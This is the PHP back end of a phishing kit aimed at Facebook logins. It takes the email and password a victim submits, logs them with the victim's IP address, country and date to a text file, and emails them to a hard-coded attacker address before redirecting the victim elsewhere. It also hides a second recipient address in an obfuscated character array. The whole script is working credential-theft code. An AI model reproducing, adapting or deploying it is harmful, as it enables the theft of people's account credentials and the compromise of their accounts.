<?php
session_start();
error_reporting(0);


$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$country = visitor_country();
$message = '<html><body>';
$message .= '<div style=" border:1px solid rgba(0, 0, 0, 0.3); border-radius:6px; box-shadow:1px 3px 2px rgba(0, 0, 0, 0.6); padding:10px;">';
$message .= '<p style="color:rgba(0, 0, 0, 0.3); font-size:12px;"> Hacked by BO <a href="mailto:aturosandaval@gmail.com?Subject=Hello%20again">contact</a></p>';
$message .= '<p style="color:#000066;font-size:18px;">EMAIL : '. $_POST['email'] . ' </p>';
$message .= '<p style="color:#000066;font-size:18px;">PASSWORD : '. $_POST['pass'] . ' </p>';
$message .= '<p style="color:#080;font-size:14px;"> ------------ IP Address & Date -------------- </p>';
$message .= '<p style="color:#000066; font-size:16px; font-weight:400">IP Address: '.$ip.' </p>';
$message .= '<p style="color:#000066; font-size:14px; font-weight:400">COUNTRY: '.$country.' </p>';
$message .= '<p style="color:#000066; font-size:14px; font-weight:400">DATE: '.$adddate.' </p>';
$message .= '</div>';
$message .= '</body></html>';


$handle = fopen("script.txt", "a");
fwrite($handle, $message);
fclose($handle);



// change your email here 
$sent ="aturosandaval@gmail.com";



$subject = "FACEBOOK 1 - ";
$headers = "From: SCRIPT>";
$headers .= $_POST['eMailAdd']."\n";
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
{
mail($mesaegs,$subject,$message,$headers);
mail($sent,$subject,$message,$headers);
}

// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
header("Location: https://www.miew.tech");
?>